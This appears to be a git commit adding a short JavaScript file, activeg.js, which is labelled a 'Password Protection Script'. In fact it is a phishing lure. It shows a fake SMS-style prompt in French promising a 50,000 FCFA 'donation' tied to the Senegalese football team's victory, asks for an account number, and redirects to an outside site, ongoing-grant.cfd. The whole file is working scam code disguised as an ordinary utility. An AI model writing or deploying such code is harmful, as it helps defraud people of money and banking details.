65feba9eef6251865328c11f932c7fbc1a1b4838
The-ongoing <preciousadaowo4@gmail.com>
2026-01-19 08:57:39 +0100

    Create activeg.js

---
+++ activeg.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L’ARGENT'
+password = prompt(
+  'SMS: Félicitations ! Vous êtes éligible pour recevoir le DON DE 50 000 FCFA DE KABIROU MBODJE POUR CÉLÉBRER LA VICTOIRE DES LIONS DE LA TERANGA. Veuillez appuyer sur OK pour saisir votre numéro de compte.',
+  'RETIRER DE L’ARGENT'
+);
+if (password != 'RETIRER DE L’ARGENT') {
+  location.href = 'https://ongoing-grant.cfd/Recompense-De-Victoire.html';
+  }
